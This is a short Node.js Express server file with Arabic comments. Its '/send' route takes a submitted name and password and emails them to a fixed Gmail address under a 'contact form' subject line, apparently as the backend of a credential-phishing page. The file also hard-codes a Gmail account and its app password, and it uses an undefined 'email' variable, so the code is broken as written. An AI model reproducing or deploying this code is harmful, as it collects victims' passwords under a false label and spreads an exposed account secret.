const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('express').urlencoded({ extended: true });
const app = express();

app.use(express.static('public'));
app.use(bodyParser);

app.post('/send', (req, res) => {
  const { name, password } = req.body;

  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: 'itinfor79@gmail.com',       // ✉️ بريدك
      pass: 'eqlfoyyxgoknvjne'           // 🔐 كلمة مرور التطبيقات
    }
  });

  const mailOptions = {
    from: email,
    to: 'itinfor79@gmail.com',           // ✉️ بريدك أيضًا
    subject: 'رسالة من نموذج التواصل',
    text: `الاسم: ${name}\nالبريد: ${password}\n`
  };

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log(error);
      return res.send('حدث خطأ أثناء الإرسال.');
    }
    res.send('تم إرسال رسالتك بنجاح!');
  });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`🚀 Running on http://localhost:${PORT}`));
